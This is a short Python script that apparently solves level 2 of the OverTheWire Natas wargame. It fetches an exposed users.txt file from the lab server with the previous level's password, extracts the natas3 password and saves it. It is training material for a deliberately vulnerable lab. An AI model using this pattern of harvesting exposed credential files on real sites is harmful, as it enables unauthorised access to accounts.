import requests

url="http://natas2.natas.labs.overthewire.org/files/users.txt"
username="natas2"
file=open('password.txt', 'r')
password=file.read()

response = requests.get(url, auth=(username, password))

str="natas3"
for line in response.text.splitlines():
    if str in line:
        l=line.split(":")
        print(l[1])
        with open('password.txt', 'w') as f:
            f.write(l[1])

file.close()